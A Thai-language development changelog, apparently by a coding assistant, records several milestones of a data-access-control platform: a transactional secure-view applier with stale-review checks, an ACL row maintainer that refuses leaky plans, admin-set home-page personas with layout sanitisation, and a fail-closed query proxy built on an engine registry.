slice 1 = view หน้าตายังไง · slice 2 = ใครได้อะไร · **ทั้งคู่เป็น pure function ไม่เคยแตะ database เลย**
slice 3 คือรอบที่มันออกจากห้องทดลอง — คลาสเดียวใน chain 5.1.2 ที่เปิด JDBC connection

### AU.1 สามเสาที่คลาสนี้ยืนอยู่ (เขียนไว้ใน javadoc ของคลาสด้วย)

| เสา | ทำอย่างไร | ถ้าไม่ทำจะเกิดอะไร |
|---|---|---|
| **view DDL กับแถว ACL ต้อง commit พร้อมกัน** | ทุกอย่างอยู่ใน transaction เดียว — `autoCommit=false` → DDL → delete → insert → `commit()` | commit คนละรอบ = มีช่วงเวลาที่คนอื่นเห็น **"ไม่มีใครเห็นอะไรเลย"** (view มาก่อน) หรือแย่กว่านั้น **"เห็นหมดทุกแถว"** (แถวมาก่อน view) |
| **dry-run ไม่ใช่คำสัญญา** | `apply()` **รัน dryRun ซ้ำข้างในtransaction** แล้วเทียบ `signature()` ไม่ตรง → `StaleReviewException` ไม่ apply อะไรเลย | คนกดอนุมัติแผนเมื่อ 10 นาทีก่อน ระหว่างนั้น entitlement เปลี่ยน → สิ่งที่ apply ไม่ใช่สิ่งที่มีคนอ่าน (FR-6.4) |
| **ลบก่อนเขียน** | `delete(...)` มาก่อน `insert(...)` เสมอ | `column_grant` มี PK `(principal, asset, column_name)` — treatment ที่เปลี่ยนคือ **delete+insert ของ PK เดียวกัน** ถ้าเขียนก่อนลบจะชน |

### AU.2 ⚠️ `WHERE` ที่หายไปหนึ่งอันคือความต่างระหว่าง apply policy กับ revoke ทั้งฐานข้อมูล

ทุก read และ write ใน `read()` / `delete()` / `insert()` ถูก **scope ด้วย asset key เสมอ**
เหตุผลไม่ใช่เรื่อง performance: `maintain(...)` คำนวณ **desired state เต็ม แล้ว diff กับ installed** ถ้า `read()` เผลอคืนแถวของ asset อื่นมาปนเป็น "สภาพปัจจุบันของ asset นี้" maintainer จะทำงาน**ถูกต้องตามที่ถูกบอก** — คือคำนวณ `delete` ให้แถวของ asset อื่นทั้งหมด แล้ว apply ก็จะลบจริง เงียบๆ สำเร็จ ไม่มี error
→ มีเทสต์ยิงตรงจุดนี้: `oneAssetsMaintenanceLeavesEveryOtherAssetAlone`

### AU.3 การตัดสินใจอื่น

| เรื่อง | ทำอย่างไร | เพราะ |
|---|---|---|
| `acl.*` ยังไม่มีในฐานข้อมูล | `read()` คืน `Rows.NONE` (เช็คด้วย `DatabaseMetaData.getTables` ทั้งตัวพิมพ์ตามที่ให้มาและตัวพิมพ์ใหญ่) | รอบแรกสุดยังไม่มีอะไร — ต้องไม่ใช่ error |
| ลบ `column_grant` | match แค่ `(principal, asset, column_name)` **ไม่รวม treatment** | treatment ที่เปลี่ยนต้องถูกลบด้วยคีย์เก่าให้ได้ ไม่งั้น insert ชน PK |
| `apply(request, null)` | `NullPointerException` — *"no approved dry run; applying without one would run a change nobody read (FR-6.4)"* | ปิดทางที่ caller จะข้าม review ไปเฉยๆ |
| `openWritable(...)` แยกจาก `open(...)` | เมธอดคนละตัวใน `JdbcTargets` | `open` เป็น read-only มาตลอด — การหยิบ connection ที่แก้ฐานข้อมูลลูกค้าได้ ต้องเป็นสิ่งที่ caller **พิมพ์ออกมาเอง** ไม่ใช่ได้มาโดยบังเอิญ |
| driver คืน `SUCCESS_NO_INFO` | `total(int[])` นับเป็น 1 | บาง driver ไม่บอกจำนวนแถวใน batch — นับเป็น 0 จะรายงานผิดว่าไม่ได้ทำอะไร |
| `rollback()` | REVOKE + `DROP VIEW IF EXISTS` เท่านั้น — **ไม่แตะ schema `acl`** | secure view ทุกตัวในฐานข้อมูลอ่านตาราง 3 ใบเดียวกัน · drop ทิ้ง = พัง asset อื่นหมด |

### AU.4 `signature()` — ของชิ้นเดียวที่กั้นระหว่าง "แผนที่มีคนอ่าน" กับ "แผนอื่น"

พังได้ 2 ทาง และพังคนละทิศ:
- **ไม่ stable** → ทุก apply ถูกปฏิเสธว่า stale → ฟีเจอร์ใช้ไม่ได้
- **ชนกัน (2 diff ได้ signature เดียว)** → apply สิ่งที่ไม่มีใครอ่าน

`SecureViewApplierTest` (6 tests, ไม่ต้องใช้ Docker) ยิงทั้งสองทิศ: ลำดับการใส่ set ไม่มีผล · insert กับ delete ของแถวเดียวกันต้องไม่เท่ากัน · treatment ที่เปลี่ยนต้องเห็นใน signature · diff ว่างต้องได้ string ว่าง

### AU.5 `SecureViewApplierIT` — 11 tests บน `postgres:16-alpine`

> สิ่งที่มันพิสูจน์ไม่ใช่ว่า statement รันผ่าน — แต่คือ **คนสองคนที่มีสิทธิ์ต่างกัน select จาก view ใบเดียวกัน ในฐานข้อมูลเดียวกัน แล้วได้คำตอบคนละอย่าง**

fixture: `sales.customer(id, email, citizen_id, branch_code)` 3 แถว (BKK-01 / CNX-01 / SGN-01) · login `analyst_a`, `analyst_b` สร้างใหม่ทุกเทสต์ และ**ไม่มีสิทธิ์อะไรบน base table เลย**

| เทสต์ | พิสูจน์อะไร |
|---|---|
| `theViewShowsEachReaderWhatTheirPolicySays` | a เห็น BKK-01/CNX-01 email = `***@example.com` citizen = `*********1111` · b เห็น SGN-01 email/citizen = `null` — **view ใบเดียว คำตอบคนละชุด** |
| `theBaseTableIsNotReadable` | `permission denied` บน `sales.customer` |
| `oneAssetsMaintenanceLeavesEveryOtherAssetAlone` | แถวของ `hr.employee` รอดทั้งหมด (ดูข้อ AU.2) |
| `aStaleReviewIsRefused` | แก้แถวหลัง dry-run → `StaleReviewException` และ **ไม่มีอะไรถูก apply** |
| `aFailureRollsBackTheWholeChange` | พังกลาง plan → ไม่เหลือ schema/แถวค้าง |
| `applyingTwiceIsIdempotent` · `revokingAPrincipalTakesTheirRowsAway` · `aChangedTreatmentReplacesTheRowItReplaces` · `rollbackDropsTheViewOnly` · `applyingUnreviewedIsRefused` · `nothingInstalledMeansEverythingIsAnInsert` | |

⚠️ **`PARTIAL` + `showLast(4)` แปลงเป็น `*********1111` ไม่ใช่ `1111`** — มันใส่ดาวแทนส่วนหน้า ไม่ได้คืนแค่ 4 ตัวท้าย (เสียเวลากับเรื่องนี้ไป 1 รอบเทสต์)

### AU.6 ของที่เพิ่ม/แก้

| ไฟล์ | อะไร |
|---|---|
| `dac-connector-source/…/SecureViewApplier.java` | **ใหม่** — `dryRun` / `apply` / `rollback` / `read` · record `Request` `DryRun` `Applied` · `StaleReviewException` |
| `dac-connector-source/…/SecureViewApplierIT.java` | **ใหม่ 11 tests** Testcontainers |
| `dac-connector-source/…/SecureViewApplierTest.java` | **ใหม่ 6 tests** — signature ล้วน ไม่ต้องใช้ Docker |
| `dac-connector-source/…/JdbcTargets.java` | `openWritable(...)` |
| `dac-connector-source/pom.xml` | + `dac-compiler-sql` (ครั้งแรกที่ module นี้เห็น compiler) |
| `dac-compiler-sql/…/ViewCompiler.java` | `Target.acl(...)` เป็น public — applier เขียนแถวลงตารางเดียวกับที่ compiler อ่าน **ชื่อตารางสองสะกดที่หลุดจากกันคือ view อ่านใบนึง แถวลงอีกใบ เงียบๆ และในทิศที่ผ่อน** |

### AU.7 ต่อจากนี้ (M5 slice 3 ครึ่งหลัง)

`EntitlementSource` implementation อ่านจาก `row_entitlement` ของ app DB · store ของ `enforcement_state` (**ตาราง V4 มีอยู่แล้ว ไม่ต้อง migrate**) · REST dry-run / apply / rollback · UI + **เอาเมนู Enforcement กลับมา**
⚠️ **`ViewCompiler` + `SecureViewApplier` ยังไม่ถูก wire เข้า `dac-service` เลย** — และตอน wire ต้องส่ง `CredentialResolver` **ตัวที่ `DacApplication` ถืออยู่** เข้าไป ห้ามสร้างใหม่
slice 4: MSSQL Testcontainers

## รอบก่อนหน้า — **M5 slice 2: `RowEntitlementMaintainer`** — อีกครึ่งของ secure view

slice 1 (`ViewCompiler`) ตอบว่า *"view หน้าตายังไง"* แต่ view เป็น object เดียวที่ทุกคนใช้ร่วมกัน มัน**พูดชื่อคนไม่ได้**
slice 2 คือครึ่งที่ตอบว่า *"ใครได้อะไร"* — เนื้อในของตาราง ACL 3 ใบที่ view join ตอนอ่าน (FR-6.1)

### AT.1 ⚠️ แก้ความเข้าใจผิดจากข้อ AK.9 — **slice 2 ไม่ต้องมี migration**

AK.9 เขียนไว้ว่า slice 2 = `V12__row_entitlement.sql` + maintainer **ข้อแรกผิด** ตาราง 3 ใบนี้อยู่ที่ **source database ไม่ใช่ app DB**:

```
acl.asset_subscription (principal, asset)                          PK(principal, asset)
acl.row_entitlement    (principal, asset, entitlement_key, value)  PK(ทั้ง 4)
acl.column_grant       (principal, asset, column_name, treatment)  PK(principal, asset, column_name)
```

`ViewCompiler.apply()` สร้างมันให้อยู่แล้วตอน apply ลง source → **ไม่มีอะไรต้อง migrate ใน app DB**
ส่วน `row_entitlement` ของ app DB (`V3__policy.sql:99`) เป็น**คนละใบ** — ใบนั้นคือ*แหล่งข้อมูล* ที่ maintainer ไปอ่านค่าของ `ENTITLEMENT_JOIN` มา ไม่ใช่ปลายทางที่เขียนลง

### AT.2 สองทางที่มันจะรั่วเงียบๆ — และทำไมต้อง **refuse ไม่ใช่ skip**

จุดที่คลาสนี้ต่างจาก maintainer ธรรมดาคือมัน**โยน exception** ในเคสที่ดูเหมือนควรจะข้ามไปเฉยๆ เหตุผลเดียวกันทั้งสองเคส: *view ก็ยัง valid, แถวก็ยัง valid, apply ก็สำเร็จ, เปิดฐานข้อมูลดูก็ถูกหมด* — แต่ข้อมูลไปถึงคนที่ policy ไม่ได้ส่งให้

| เคส | ถ้าเขียนลงไปเฉยๆ | ทำแทน |
|---|---|---|
| treatment key ไม่มีอยู่ใน `Plan.treatments()` ของ column นั้น | ไม่ match branch ไหนเลย → คนอ่านตกไปที่ `ELSE` เงียบๆ · **ทิศอันตราย** = decision ใหม่เข้มกว่า fallback ที่ติดตั้งอยู่ → อ่านได้มากกว่าที่ policy อนุญาต | `MismatchedPlanException` — "Recompile the view from these decisions before maintaining its rows." |
| entitlement key ไม่มีใน `Plan.entitlementKeys()` | view ไม่ได้ join คีย์นั้น → เขียนแถวไปก็ไม่ได้กรองอะไร **ทุกแถวกลับมาหมด** | refuse เหมือนกัน |
| policy mask column ที่ view select ดิบๆ (ตอน compile ยังไม่มีใคร mask) | ไม่มีแถวไหนในตารางทั้ง 3 ใบที่ทำให้ view mask ได้ → **อ่านได้ในรูปแบบดิบ** | refuse — "they would read it in the clear" |

> ทิศตรงข้าม (view มี gate แต่คนนี้ไม่มีค่าเลย) **ไม่ refuse** เพราะมันปิดไม่ใช่เปิด — แค่ใส่ note ว่า "Nothing gives X any value of Y … They will read no rows of this asset until something does."

### AT.3 การตัดสินใจอื่นที่เป็นเรื่องความหมาย ไม่ใช่รายละเอียด

| เรื่อง | ทำอย่างไร | เพราะ |
|---|---|---|
| **`ALWAYS_FALSE`** | **ไม่ออกแถว `asset_subscription` ให้เลย** | view เขียน `1=0` ให้คนเดียวไม่ได้ — การไม่ให้ subscription พูดประโยคเดียวกันเป๊ะ |
| **plaintext ต้องมีแถว** | ถ้า `PLAIN` ไม่ใช่ fallback ของ column นั้น → ต้องเขียน `column_grant` ที่ treatment = `PLAIN` | `maskedColumn()` ใส่ `PLAIN` เป็น candidate ตัวหนึ่งเสมอ การ "ไม่มี mask" จึงไม่เท่ากับ "ไม่ต้องขออะไร" |
| **fallback ไม่ต้องมีแถว** | คนที่ได้ treatment เดียวกับ `ELSE` → ข้าม | เขียนไปก็แค่ทำให้ตารางใหญ่ขึ้นโดยไม่เปลี่ยนอะไร |
| **hidden column** | **ไม่ออกแถว** + note | hide ชนะ mask (FR-4.5) แต่ view ตัด column ให้คนเดียวไม่ได้ → ปล่อยให้ตกไปที่ fallback ซึ่งเป็นสิ่งที่เข้มที่สุดที่ view ทำกับ column นั้นได้ · ⚠️ **ถ้าตีความว่า "ไม่มี mask = PLAIN" จะกลายเป็นการ grant plaintext ให้คนที่ policy สั่งซ่อน** — มีเทสต์ยิงตรงจุดนี้ |
| **denied principal** | ไม่เหลืออะไรเลยทั้ง 3 ใบ | ถ้าปล่อยแถวค้างไว้ วันที่มีคนไปกด subscribe ใหม่ด้วยมือ เขาจะได้สิทธิ์เก่ากลับมาทั้งชุด |
| **คำนวณ desired state เต็ม แล้ว diff** | ไม่ใช่ "emit เฉพาะ insert ที่รู้" | ตารางทั้ง 3 ใบถูกอ่านด้วย `EXISTS` → **แถวที่ควรถูกลบแล้วไม่ถูกลบ คือความพังที่สำคัญ** ไม่ใช่แถวที่ควรเขียนแล้วไม่ได้เขียน · การ revoke จึงต้องมาจาก `delete` ของ diff |
| **negated gate (`NOT_IN` / `NE`)** | เขียนค่าเหมือนเดิม | `gate()` ของ compiler ทำ `NOT EXISTS` ให้แล้ว → แถวพวกนั้นคือค่าที่เขา **ห้าม**เห็น ไม่ใช่ที่อนุญาต อ่านโค้ดตรงนี้ต้องระวัง |
| **`EXISTS` / `NOT_EXISTS`** | ไม่ออกแถว | ไม่ได้ถามอะไรเกี่ยวกับคนอ่าน |
| **`RAW_PREDICATE`** | ไม่ออกแถว | ประโยคเดียวกันสำหรับทุกคน อยู่ใน view แล้ว เขียนซ้ำ = สำเนาที่ 2 ที่ต้องคอยดูแลให้ตรงกัน |
| **mask ซ้ำ column เดียวใน decision เดียว** | เข้มสุดชนะ เสมอกันถือครองเดิม (`MaskStrength`) | engine ควรรีดให้เหลือตัวเดียวอยู่แล้ว — ที่ใส่ไว้เพื่อไม่ให้แถวที่ได้ขึ้นกับ*ลำดับ*ที่ engine เรียงมา |

### AT.4 `EntitlementSource` — ทำไมต้อง inject

`ENTITLEMENT_JOIN` เป็นเคสเดียวที่ **decision ไม่พกค่ามาด้วย** (mapping ใหญ่/เปลี่ยนบ่อยเกินกว่าจะ inline) → maintainer ต้องไปอ่านเอง
เป็น `@FunctionalInterface` ที่ slice 3 จะ implement ด้วย `row_entitlement` ของ app DB · `EntitlementSource.NONE` คืนค่าว่างเสมอ = **ซ่อนทุกแถวของคีย์นั้น** ซึ่งเป็นทิศที่ถูกเวลาพัง

### AT.5 ของที่เพิ่ม

| ไฟล์ | อะไร |
|---|---|
| `dac-compiler-sql/…/RowEntitlementMaintainer.java` | **ใหม่** — pure ทั้งคลาส ไม่มี JDBC · `maintain(plan, assetKey, decisions, entitlements, installed)` → `Maintenance {desired, insert, delete, notes}` · record `Subscription` / `Entitlement` / `ColumnGrant` / `Rows` · `MismatchedPlanException` |
| `dac-compiler-sql/…/RowEntitlementMaintainerTest.java` | **ใหม่ 17 tests** — ทุกเทสต์ **compile view จาก decision ชุดเดียวกับที่เอาไป maintain** เพราะสิ่งที่ต้องพิสูจน์คือสองครึ่งไม่หลุดจากกัน เทสต์ที่ hand-write plan เองจะพิสูจน์แค่ว่า maintainer ตรงกับคนเขียนเทสต์ |

### AT.6 ต่อจากนี้ (M5 slice 3)

JDBC applier: อ่าน `acl.*` ปัจจุบัน → `maintain(...)` → แสดง dry-run (`insert`/`delete` + `notes`) ให้คนกดอนุมัติ → apply ใน transaction เดียวกับ view DDL + `enforcement_state` + REST + UI + **เอาเมนู Enforcement กลับมา**
`EntitlementSource` implementation อ่านจาก `row_entitlement` ของ app DB · **`ViewCompiler` ยังไม่ถูก wire เข้า dac-service เลย** (`grep -rln ViewCompiler` เจอแค่ `DecisionSql` + ตัวมันเอง + เทสต์) — slice 3 คือรอบที่มันจะได้ออกจากห้องทดลอง

## รอบก่อนหน้า — **M12b Persona: หน้าแรกที่ admin จัดให้แต่ละ Platform Role** (ผู้ใช้ขอไว้ตั้งแต่รอบ M12)

ผู้ใช้สั่งไว้ว่า

> *"อันนี้ให้ Admin เป็นคน Confiure ให้ได้ ว่าแต่ละ Platform Role จะเห้นหน้าจอ Home ลักษณะแบบไหน เหมือนเป็น Persona ต่างๆ"*

M12 ให้ทุกคนจัดหน้าแรกของตัวเองได้แล้ว แต่ **หน้าแรกของคนที่ยังไม่เคยเปิด editor ถูกตัดสินอยู่ในโค้ด** — อยากให้ auditor เห็นคนละหน้ากับ requester ทำได้ทางเดียวคือแก้โค้ดแล้ว deploy ใหม่ รอบนี้ย้ายการตัดสินใจนั้นขึ้นมาบนหน้าจอ

### AS.1 ลำดับการ resolve — **personal → role → built-in** และทำไมต้องเรียงแบบนี้

```
GET /v1/home/layout
      │
      ├─ มีแถวใน home_layout ของ principal นี้ ?  ── ใช่ ──►  LayoutSource.PERSONAL
      │                                             (ไม่สนว่า admin ตั้ง persona ไว้หรือไม่)
      ├─ ไล่ persona ที่ถือ เรียงจากแรงสุด          ── เจอ ──►  LayoutSource.ROLE + sourceRole
      │   PLATFORM_ADMIN > POLICY_AUTHOR >
      │   DATA_OWNER > AUDITOR > REQUESTER
      └─ ไม่เจอเลย                                        ►  LayoutSource.BUILT_IN
```

**สามข้อที่เป็นการตัดสินใจ ไม่ใช่รายละเอียด:**

| การตัดสินใจ | เหตุผล |
|---|---|
| **personal ชนะ persona เสมอ** และ persona **ไม่ถูก copy ลง `home_layout`** | ถ้า copy ลงไปตอน admin กด Save คนที่จัดหน้าตัวเองไว้แล้วจะโดนรื้อ — persona คือ*จุดเริ่มต้น* ไม่ใช่*คำสั่ง* ถ้าอยากให้เป็นคำสั่งต้องเป็นฟีเจอร์คนละตัวที่มี audit คนละเรื่อง |
| **precedence ไม่ใช่ merge** | หน้าจอสองหน้า average กันไม่ได้ — ครึ่งนึงของอันนึงบวกครึ่งนึงของอีกอัน = หน้าที่ไม่มีใครออกแบบ |
| **ไล่ทั้งลิสต์ ไม่ใช่หยุดที่ role แรกที่ถือ** | ถ้าหยุดที่ตัวแรก การจัดหน้า AUDITOR จะไม่มีผลกับ auditor ที่เขียน policy ด้วย ซึ่งคือ auditor เกือบทั้งหมด |

> **ทำไม REQUESTER อยู่ล่างสุด:** เพราะเป็น role ที่แทบทุกคนถือติดตัว ถ้าเอาไว้บนสุด การจัดหน้า requester จะไปรื้อหน้าแรกของทุกคนในระบบเงียบๆ

### AS.2 ⚠️ ที่แรกในผลิตภัณฑ์ที่ **markup ของคนหนึ่ง ถูก render ใน session ของอีกคน โดยตั้งใจ**

`home_layout` ของ M12 คนเขียนกับคนอ่านเป็นคนเดียวกันเสมอ — `HomeLayoutValidator` มีไว้กันคนทำร้ายตัวเอง
`home_role_layout` **ไม่ใช่แบบนั้น** — note widget ที่ admin เซฟลง persona POLICY_AUTHOR จะถูก render ให้ policy author ทุกคนที่ยังไม่ได้จัดหน้าตัวเอง

ฉะนั้น:
- ล้างผ่าน `HomeLayoutValidator` **ทั้งตอนเขียนและตอนอ่าน** เหมือนเดิมทุกประการ — และคราวนี้ไม่ใช่ belt-and-braces แต่เป็นเส้นแบ่งจริง
- เขียนได้เฉพาะ `@Secured("PLATFORM_ADMIN")` — การจัดหน้า POLICY_AUTHOR คือการจัดหน้าของ policy author ทุกคน มันเป็น**การกระทำระดับ platform** ไม่ใช่ระดับ authoring
- `DacApplication` สร้าง `HomeLayoutStore` **ก้อนเดียว** แล้วส่งให้ทั้ง `HomeResource` และ `HomePersonaResource` → validator ตัวเดียวกัน ไม่มีทางเข้าที่สอง
- มีเทสต์ยืนยันตรงๆ: `aPersonaIsCleanedLikeAnyOtherLayout` — เซฟ `<script>` ลง persona แล้วอ่านกลับ**ในฐานะคนอื่น**

### AS.3 ของที่เพิ่ม

| ชั้น | ของ |
|---|---|
| Migration | **`V19__home_role_layout.sql`** — PK เป็น `app_role` (CHECK 5 ค่าเดียวกับ `app_role_assignment`) · ไม่มีแถว = built-in |
| Model | `HomeLayout.Persona` (enum เรียงตาม precedence + `heldBy(Set<String>)` คืน**ทั้งหมด**ที่ถือ เรียงแรงสุดก่อน) · `LayoutSource {PERSONAL, ROLE, BUILT_IN}` · `LayoutView` กว้างขึ้นจาก 4 → 6 field พร้อม factory 3 ตัว · `PersonaLayout` |
| Store | `forPrincipal(id, governanceReader, personas)` · `inheritedFor(...)` (แยกออกมาเพราะ `reset` ต้องตอบคำถามเดียวกัน) · `builtInFor(persona)` · `personas()` · `savePersona(...)` · `resetPersona(...)` |
| API | `GET/PUT/DELETE /v1/home/personas[/{role}]` — `HomePersonaResource`, admin-only, role ผิด = **404 ไม่ใช่ 400** (คนขอมาด้วย address ของหน้าที่ไม่มีอยู่) |
| Frontend | `api/home.ts` (+`source`, `sourceRole`, `HomePersonaLayout`, 3 ฟังก์ชัน) · **`settings/HomePersonasPage.tsx`** (ใช้ `HomeEditor` ตัวเดิมซ้ำ) · การ์ดใน Settings · route `/settings/home` |

### AS.4 `reset` เปลี่ยนความหมาย — และเปลี่ยนถูกแล้ว

เดิม: กด Reset → ได้หน้า built-in
ตอนนี้: กด Reset → ได้**หน้าที่ตัวเองจะได้ถ้าไม่เคยแตะเลย** ซึ่งคือ persona ของ role ถ้ามี

ถ้าไม่แก้ตรงนี้ คนที่กด Reset หลัง admin จัดหน้า auditor ไว้ จะเด้งไปหน้าที่ product ship มาเมื่อปีที่แล้ว แทนที่จะเป็นหน้าที่ทีมเขาใช้กันอยู่ — เทสต์ `resetLandsOnTheRolePageWhenThereIsOne`

### AS.5 `HomeEditor` ถูกใช้ซ้ำ — แต่**ประโยคเดียวที่ห้ามใช้ซ้ำ**

`HomeEditor` เดิมเขียนหัวข้อไว้ว่า *"Only yours. Nothing here changes what anyone else sees"*
ใน persona editor ประโยคนี้ **เป็นเท็จ** → เพิ่ม prop `heading` / `subheading` / `resetLabel` (มี default เท่าเดิมทุกตัว หน้าจอเดิมไม่ขยับสักพิกเซล) แล้ว persona editor ส่งประโยคของตัวเองเข้าไป:

> *"Everyone with this role who has not arranged their own page will see this. Anyone who has arranged theirs keeps it."*

และหน้า Home ของแต่ละคนก็บอกที่มาของหน้าที่กำลังจะแก้ด้วย (เฉพาะตอนกด Edit — หน้าอ่านปกติไม่เปลี่ยน):

> *"You are starting from the page your administrator arranged for the auditor role. Saving makes it yours, and later changes to that page will no longer reach you."*

> ⚠️ **`HomeResource` Javadoc ที่เขียนว่า "There is deliberately no administrator override" ถูกเขียนใหม่แล้ว** — ประโยคนั้นเป็นจริงตอน M12 และเป็นเท็จตอน M12b ถ้าปล่อยไว้คือ comment ที่โกหกคนอ่านคนถัดไป

## รอบก่อนหน้า — **M18 slice 1: ชื่อ engine หายไปจากโค้ดทั้ง 14 จุด** · และ **proxy หยุด query ที่มันบังคับ policy ไม่ได้ แทนที่จะปล่อยผ่าน**

> ผู้ใช้สั่งสลับลำดับให้ M18 ขึ้นก่อนทุกอย่าง (`ปรับมาทำส่วนนี้ก่อนเลย เพื่อสร้างฐานให้แข็งแรง`) และให้เริ่มที่ฝั่ง proxy
> รอบนี้คือ slice 1 ของ M18 — **ปิดครบทั้ง 14 จุดที่ AP.7 นับไว้** บวกของที่เจอระหว่างทางอีกสองอย่าง

### AR.1 registry ตัวเดียวที่ทุกจุดอ่าน — `com.mfec.dac.common.engine`

ของใหม่ 4 ไฟล์ใน `dac-common` (โมดูลที่**ไม่มี** JDBC driver และ**ไม่มี** SQL compiler อยู่บน classpath ซึ่งเป็นข้อจำกัดที่กำหนดรูปร่างของ interface):

| ไฟล์ | หน้าที่ |
|---|---|
| `SourceEngine.java` | interface — `id()` · `displayName()` · `defaultPort()` · `supportsSchemas()` · `driverClassName()` · `jdbcUrl(JdbcCoordinates)` · `dialectId()` · `proxyCapabilities()` · nested `record JdbcCoordinates` ที่ปฏิเสธ host ว่างและ port นอกช่วง 1–65535 ตั้งแต่ constructor · nested `Capability` ที่ถือ `ROW_FILTER` / `COLUMN_MASK` / `CELL_MASK` / `COLUMN_HIDE` |
| `SourceEngines.java` | registry — `all()` · `ids()` · `find()` · `of()` · `UnsupportedEngineException extends IllegalArgumentException` |
| `PostgresEngine.java` | POSTGRES · PostgreSQL · 5432 · `org.postgresql.Driver` · url fallback เป็น database `postgres` · capability ครบ 4 |
| `SqlServerEngine.java` | SQLSERVER · SQL Server · 1433 · `com.microsoft.sqlserver.jdbc.SQLServerDriver` · url ระบุ `encrypt=true;trustServerCertificate=true` ตรงๆ · capability ครบ 4 |

**สองการตัดสินใจที่ควรอ่านก่อนแก้:**

1. **`dialectId()` คืน String ไม่ใช่ `SqlDialect`** — เพราะถ้าคืน object โมดูลที่แค่เปิด socket (`dac-connector-source`) จะต้องลาก SQL compiler มาทั้งก้อน · ราคาของการเลือกแบบนี้คือไม่มีอะไรใน `dac-common` รู้ว่าชื่อ dialect นั้น resolve ได้จริงไหม → หนี้ก้อนนี้จ่ายด้วย `SqlDialectsTest` ที่เดินทุก engine ที่ลงทะเบียนแล้วเรียก `SqlDialects.forEngine()` จริง (อยู่ใน `dac-compiler-sql` ซึ่งเห็นทั้งสองฝั่ง)
2. **`REGISTRY` เป็น static map ไม่ใช่ `ServiceLoader`** — engine ที่ platform นี้บังคับ policy ได้คือ**การตัดสินใจ** ไม่ใช่ผลข้างเคียงของการแพ็ก jar · ServiceLoader แปลว่า jar ที่หล่นเข้า classpath เพิ่ม engine ได้เงียบๆ ซึ่งเป็นสิ่งสุดท้ายที่อยากได้ในระบบควบคุมการเข้าถึงข้อมูล

### AR.2 switch ทั้ง 3 ตัวหายไปแล้ว — และระหว่างทางเจอโค้ดที่ copy ตัวเอง

| ที่เดิม | เปลี่ยนเป็น |
|---|---|
| `JdbcTargets.url()` — `switch (engine)` | `SourceEngines.of(target.engine()).jdbcUrl(coordinates(target))` |
| `SourceProbe.jdbcUrl()` — **switch ชุดเดียวกัน copy มาทั้งดุ้น** | ลบทิ้งทั้ง method → เรียก `JdbcTargets.url(target)` |
| `QueryService.dialectFor()` — `switch` ที่ default เป็น Postgres | `SqlDialects.forEngineId(source.engine().name())` |

🐛 **ของที่เจอ:** `JdbcTargets` มี javadoc เขียนไว้เองว่ามันมีอยู่เพื่อ *"ให้ probe กับ proxy ต่อเหมือนกัน"* — แต่ `SourceProbe` **copy ทั้ง URL builder และ block ที่ตั้ง `Properties` ไปไว้ในตัวเอง** คือคลาสที่เกิดมาเพื่อกันการ duplicate มี duplicate ของตัวเองอยู่ข้างใน · รอบนี้ยุบทั้งสองอย่างเข้า `JdbcTargets` แล้ว (`properties(Credential)` ตัวเดียว) ซึ่งสำคัญกว่าที่เห็น เพราะข้อโต้แย้งเรื่องความปลอดภัยของ FR-6.3.1 คือ *DBA ต้องแยก traffic ของเราออกจากของ user ได้ใน `pg_stat_activity`* — ซึ่งจริงก็ต่อเมื่อ probe / introspector / proxy ประกาศชื่อตัวเองเหมือนกันทุกตัว

⚠️ `dialectFor()` เดิม **default เป็น Postgres dialect** แปลว่า engine ที่ไม่รู้จักจะได้ SQL ของ Postgres ไปยิง — ไม่ใช่แค่ error แต่เป็น error ที่ **อาจสำเร็จ**

### AR.3 🔒 proxy fail-closed แล้ว — `ProxyCapabilities`

ของใหม่: `backend/dac-proxy/src/main/java/com/mfec/dac/proxy/ProxyCapabilities.java`

```java
ProxyCapabilities.require(SourceEngines.of(source.engine().name()), fqn.get(), decision);
```

- `required(decision)` → แปลง decision เป็นเซตของ capability ที่ต้องใช้ (row predicate → `ROW_FILTER` · hidden column → `COLUMN_HIDE` · mask ที่ไม่มีเงื่อนไข → `COLUMN_MASK` · mask ที่มีเงื่อนไข → `CELL_MASK`)
- `missing(engine, decision)` → ตัวที่ engine นั้นทำไม่ได้ **ทั้งหมด** ไม่ใช่ตัวแรก
- `require(...)` → โยน `QueryRewriter.RefusedException` ที่บอก **ชื่อ asset + สิ่งที่ทำไม่ได้ + ให้ไปทำอะไรแทน** (*"Enforce this asset through a secure view instead."*) — refusal ที่ไม่บอกทางออกคือ refusal ที่คนแก้ด้วยการปิด policy

**วางไว้หลัง `recordDecision(...)` โดยตั้งใจ** — query ที่กำลังจะถูกปฏิเสธเพราะ engine ทำไม่ได้ ก็ยังเป็น decision ที่เกิดขึ้นจริง · auditor ที่ถามว่า "ใครพยายามอ่านตารางนี้บ้าง" ต้องได้คำตอบเดียวกันไม่ว่าตารางนั้นอยู่ engine ไหน

⚠️ **ทำไมไม่ใช้ตาราง `engine_capability`** — ตารางนั้นตอบว่า *engine* บังคับอะไรได้เอง (โหมด 5.1.1 / 5.1.2) · แต่โหมด proxy ไม่มีอะไรถูกบังคับโดย engine เลย ARAK เขียน statement ใหม่เอง คำถามจึงเป็น *rewriter ของ build นี้พูดอะไรได้* ซึ่งเป็นข้อเท็จจริงเกี่ยวกับโค้ด ไม่ใช่เกี่ยวกับ database · และสองคำตอบนี้**ต่างกันจริงทั้งสองทาง** — Postgres ไม่มี column masking ใน core เลย แต่ proxy mask column ของมันได้สบาย

### AR.4 `V18__source_engine.sql` — `CHECK` สองอันกลายเป็นตารางที่อ่านได้

```sql
CREATE TABLE source_engine (id, display_name, default_port, supports_schemas);
DELETE FROM engine_capability WHERE mode = 'PROXY';
ALTER TABLE data_source        DROP CONSTRAINT data_source_engine_check;
ALTER TABLE data_source        ADD  CONSTRAINT data_source_engine_fkey        FK → source_engine ON DELETE RESTRICT;
ALTER TABLE engine_capability  DROP CONSTRAINT engine_capability_engine_check;
ALTER TABLE engine_capability  ADD  CONSTRAINT engine_capability_engine_fkey  FK → source_engine ON DELETE CASCADE;
CREATE INDEX data_source_engine_idx ON data_source (engine);
```

- `CHECK (engine IN (...))` **อ่านไม่ได้** — ไม่มีใครถาม database ได้ว่ารองรับ engine อะไรบ้าง นั่นคือเหตุผลที่ frontend ไปพิมพ์ list เอง 6 ที่ · และการขยายมันต้อง rewrite ตาราง production
- **`DROP CONSTRAINT` เขียนแบบไม่มี `IF EXISTS` โดยตั้งใจ** — ถ้าชื่อที่ Postgres generate ไม่ตรง migration ต้องพังเสียงดัง ไม่ใช่ปล่อยให้ CHECK เก่าค้างอยู่คู่กับ FK ใหม่เงียบๆ
